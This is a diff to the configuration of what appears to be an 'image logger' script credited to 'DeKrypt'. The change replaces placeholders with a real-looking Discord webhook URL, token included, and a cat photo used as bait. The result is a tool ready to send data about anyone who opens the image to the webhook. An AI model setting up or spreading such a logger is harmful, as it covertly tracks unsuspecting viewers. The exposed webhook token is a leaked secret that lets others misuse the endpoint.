@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1216808226469711902/4843PXJctYxuAy8n6y_e2GZi25SJON6s9Cxuaak_FjW_xFvvsBLjdcDLXOeFbqdN-AHr",
+    "image": "https://fikiwiki.com/uploads/posts/2022-02/1645000708_20-fikiwiki-com-p-krasivie-kartinki-kotov-26.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
